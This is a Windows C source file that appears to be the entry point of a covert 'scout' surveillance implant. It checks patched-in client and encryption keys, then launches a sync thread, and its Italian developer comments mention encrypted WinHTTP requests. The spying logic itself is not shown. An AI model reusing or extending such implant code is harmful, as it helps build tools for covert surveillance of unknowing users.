#include <Windows.h>


#include "main.h"
#include "binpatched_vars.h"

#pragma comment(lib, "advapi32")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "netapi32")

extern VOID SyncThreadFunction();

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR    lpCmdLine,
	int       nCmdShow)
{
	// FIXME tutte le malloc per la cifratura(verificare che il padding non vada a scrivere piu' avanti
	if (DEMO_TAG[0] != 0x0 && WMARKER[0] != 0x0 && CLIENT_KEY[0] != 0x0 && ENCRYPTION_KEY_CONF[0] != 0x0
		&& GetCurrentProcessId() != 4) 
	{
		// devi referenziarle o CL non le compila, trova come disabilitare sta cagata /OPT:ref non sembra andare
		MessageBox(NULL, L"Scouting :)", L"Scouting :)", 0);
#ifdef _DEBUG_BINPATCH
		MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
#endif
	}

	// FIXME: TODO: GetLastInputInfo 

	// FIXME: verificare e zappare i wprintf che non supportano > 1024 byte di buffah
	// FIXME: verificare il ritorno di tutte le WinHttpSendRequest & GetResponse senno' sbomba, no?!
	// FIXME: upgrade
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}